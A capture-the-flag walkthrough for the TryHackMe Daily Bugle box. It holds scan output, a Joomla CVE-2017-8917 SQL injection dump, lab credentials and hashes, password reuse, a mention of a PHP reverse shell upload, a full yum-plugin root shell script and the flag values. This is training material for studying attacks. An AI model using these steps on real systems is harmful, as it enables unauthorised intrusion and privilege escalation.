# Box Name
---

## Overview
---
* [[#Enumeration]]
	* nmap,ferox

* [[#Initial Foothold]]
	* joomla CVE-2017-8917,password reuse

* [[#Privilege Escalation]]
	* gtfobins

---
## Enumeration
---
# nmap
```
Nmap 7.91 scan initiated Sun May  9 11:32:35 2021 as: nmap -vvv -p 22,80,3306 -sC -sV -T4 -oN nmap/initial 10.10.14.201
Nmap scan report for 10.10.14.201
Host is up, received syn-ack (0.14s latency).
Scanned at 2021-05-09 11:32:35 CDT for 18s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)


```

# ferox
```
ferox -u http://10.10.16.137 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -x html,txt,php -C 403 -o logs/ferox.md

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.88.236
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        7l       20w      232c http://10.10.14.201/cli
301        7l       20w      236c http://10.10.14.201/modules
301        7l       20w      234c http://10.10.14.201/cache
301        7l       20w      236c http://10.10.14.201/plugins
301        7l       20w      236c http://10.10.14.201/layouts
301        7l       20w      243c http://10.10.14.201/plugins/system
301        7l       20w      244c http://10.10.14.201/plugins/captcha
301        7l       20w      235c http://10.10.14.201/images
301        7l       20w      244c http://10.10.14.201/layouts/plugins
301        7l       20w      249c http://10.10.14.201/plugins/system/cache
301        7l       20w      237c http://10.10.14.201/includes
200        0l        0w        0c http://10.10.14.201/plugins/system/cache/cache.php
200       59l       92w     1696c http://10.10.14.201/plugins/system/cache/cache.xml
200       80l      493w     3005c http://10.10.14.201/htaccess.txt

```

- # robots.txt
```

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

- # joomla login located at /administrator/
- ![[Pasted image 20220309155037.png]]

- # CVE-2017-8917 SQL injection Vulnerability in Joomla! 3.7.0 exploit
```bash
python joomblah.py http://10.10.207.18
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
('  -  Found table:', 'fb9j5_users')
('  -  Extracting users from', 'fb9j5_users')
(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
('  -  Extracting sessions from', 'fb9j5_session')
(' [$] Found session', ['811', 'hoar1aple6214ngh9gg5364ae5', 'jonah'])


```

- ## find jonah's joomla login creds
	
## Initial Foothold
---
- # log into joomla as jonah
	- ### joomla creds
	- ### jonah:spiderman123
- ## upload a php revshell in templates using the index.php file[[revshell]]


# manual enumeration 
- ## manually search for config files 
	- ### found /var/www/html/configuration.php
	- ### cat /var/www/html/configuration.php
```bash

<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';

```

# found msql info
```sql
public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';

```

- # log into mysql
```mysql
bash-4.2$ mysql -u root -p -D joomla
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 131
Server version: 5.5.64-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [joomla]> 


```

- ## mysql dosn't revile much


- ## check for possible password reuse
	- ### ls -l /home
		```bash
		
		bash-4.2$ ls -la /home
		total 0
		drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
		dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
		drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
		```
	- ### only one user listed
	- #### su jjameson using mysql password

```bash
[jjameson@dailybugle ~]$ ls -la
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt

```
---

## Privilege Escalation
----
# sudo -l
```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```

# ssh using reused password
```bash
 ssh jjameson@10.10.207.18     
The authenticity of host '10.10.207.18 (10.10.207.18)' can't be established.
ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.207.18' (ED25519) to the list of known hosts.
jjameson@10.10.207.18's password: 
Last login: Wed Mar  9 16:27:48 2022
[jjameson@dailybugle ~]$
```
- # yum [[gtfobins]]
- # Spawn interactive root shell by loading a custom plugin.
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y


```


- # cat user.txt
```bash
sh-4.2# cat /home/jjameson/user.txt 
27a260fe3cba712cfdedb1c86d80442e
sh-4.2#
```

- # cat root.txt
```bash
sh-4.2# cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
sh-4.2# 
```